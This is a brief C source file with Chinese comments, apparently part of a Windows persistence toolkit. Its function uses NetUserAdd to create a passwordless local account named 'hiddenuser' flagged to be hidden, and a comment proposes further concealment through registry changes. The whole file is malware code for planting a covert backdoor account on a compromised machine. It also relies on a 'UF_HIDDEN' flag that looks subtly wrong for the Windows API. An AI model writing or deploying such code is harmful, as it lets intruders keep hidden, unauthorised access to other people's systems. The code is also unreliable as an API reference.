#include <stdio.h>
#include <windows.h>
#include <lm.h>
#include "windows_persistence_hidden_user.h"

#ifdef HIDDEN_USER_MOD
void setup_create_hidden_user() {
    USER_INFO_1 ui;
    DWORD dwLevel = 1;
    DWORD dwError = 0;
    NET_API_STATUS nStatus;

    // 设置用户信息
    ui.usri1_name = L"hiddenuser";
    ui.usri1_password = NULL;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT | UF_HIDDEN;
    ui.usri1_script_path = NULL;

    // 添加用户
    nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&ui, &dwError);

    if (nStatus == NERR_Success) {
        printf("隐藏用户已创建。\n");
    } else {
        printf("用户创建失败: %d\n", nStatus);
    }

    // 进一步隐藏用户的操作（如修改注册表）可以在这里添加
}
#endif

// 可以添加其他支持持久化隐藏用户的函数
